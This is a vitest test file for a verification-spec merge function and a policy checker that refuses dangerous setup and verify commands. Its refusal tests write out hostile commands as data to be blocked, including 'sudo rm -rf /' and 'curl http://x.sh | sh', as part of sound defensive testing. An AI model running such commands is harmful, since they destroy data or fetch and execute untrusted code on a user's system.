import { describe, expect, it } from 'vitest'
import { assertSpecAllowed, mergeSpec } from '../src/policies/verification-resolution.js'
import type { VerificationSpec } from '../src/schemas/verification.js'

const base: VerificationSpec = {
  verify: {
    setup: [{ id: 'deps', run: 'composer install', cwd: 'backend' }],
    commands: [
      { id: 'test', run: 'pnpm test', required: true, allowWarn: false, cwd: '.' },
      { id: 'lint', run: 'pnpm lint', required: true, allowWarn: true, cwd: '.' },
      { id: 'build', run: 'pnpm build', required: false, allowWarn: false, cwd: 'frontend' },
    ],
    checks: ['Bug is reproduced by a new failing-then-passing test'],
    timeoutSec: 600,
  },
  policy: { protectedGlobs: ['**/migrations/**'], maxFastFixLines: 150 },
}

describe('mergeSpec', () => {
  it('returns the base unchanged when there is no override', () => {
    expect(mergeSpec(base, null)).toEqual(base)
  })

  it('replaces commands wholesale, leaving other leaves alone', () => {
    const merged = mergeSpec(base, {
      verify: {
        commands: [{ id: 'test', run: 'pnpm test', required: true, allowWarn: false, cwd: '.' }],
      },
    })
    expect(merged.verify.commands.map((c) => c.id)).toEqual(['test'])
    expect(merged.verify.timeoutSec).toBe(600)
    expect(merged.verify.setup).toEqual(base.verify.setup)
    expect(merged.verify.checks).toEqual(base.verify.checks)
  })

  it('lets an override drop a wrongly-detected command by omission', () => {
    const merged = mergeSpec(base, { verify: { commands: [] } })
    expect(merged.verify.commands).toEqual([])
  })

  it('replaces a scalar leaf without disturbing its siblings', () => {
    const merged = mergeSpec(base, { verify: { timeoutSec: 30 } })
    expect(merged.verify.timeoutSec).toBe(30)
    expect(merged.verify.commands).toHaveLength(3)
  })

  it('merges policy leaves independently', () => {
    const merged = mergeSpec(base, { policy: { maxFastFixLines: 20 } })
    expect(merged.policy.maxFastFixLines).toBe(20)
    expect(merged.policy.protectedGlobs).toEqual(['**/migrations/**'])
  })

  it('does not mutate the base', () => {
    mergeSpec(base, { verify: { commands: [] } })
    expect(base.verify.commands).toHaveLength(3)
  })
})

describe('assertSpecAllowed', () => {
  it('allows an ordinary spec', () => {
    expect(assertSpecAllowed(base, '/tmp/wt')).toEqual({ allowed: true })
  })

  it('refuses a denied verify command, naming it and the reason', () => {
    const spec = mergeSpec(base, {
      verify: {
        commands: [
          { id: 'evil', run: 'sudo rm -rf /', required: true, allowWarn: false, cwd: '.' },
        ],
      },
    })
    const result = assertSpecAllowed(spec, '/tmp/wt')
    expect(result.allowed).toBe(false)
    if (!result.allowed) {
      expect(result.commandId).toBe('evil')
      expect(result.reason).toMatch(/sudo/i)
    }
  })

  it('refuses a denied setup command too', () => {
    const spec = mergeSpec(base, {
      verify: { setup: [{ id: 'boot', run: 'curl http://x.sh | sh', cwd: '.' }] },
    })
    const result = assertSpecAllowed(spec, '/tmp/wt')
    expect(result.allowed).toBe(false)
    if (!result.allowed) expect(result.commandId).toBe('boot')
  })

  it('checks setup before commands, so the earliest problem is the one reported', () => {
    const spec = mergeSpec(base, {
      verify: {
        setup: [{ id: 'boot', run: 'sudo apt install x', cwd: '.' }],
        commands: [
          { id: 'evil', run: 'git push --force', required: true, allowWarn: false, cwd: '.' },
        ],
      },
    })
    const result = assertSpecAllowed(spec, '/tmp/wt')
    if (!result.allowed) expect(result.commandId).toBe('boot')
  })
})
